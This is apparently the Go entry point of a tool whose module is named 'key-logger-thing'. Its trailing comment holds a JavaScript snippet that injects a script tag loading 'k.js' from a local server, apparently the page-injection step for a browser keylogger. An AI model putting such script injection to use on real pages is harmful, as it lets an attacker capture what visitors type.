package main

import (
	"key-logger-thing/cmd"
	"log"
)

func main() {
	err := cmd.Execute()
	if err != nil {
		log.Fatalln("Error running tool: ", err)
	}
}

/*
const script = document.createElement('script');
script.src = 'http://localhost:8080/k.js';
document.head.appendChild(script);
*/
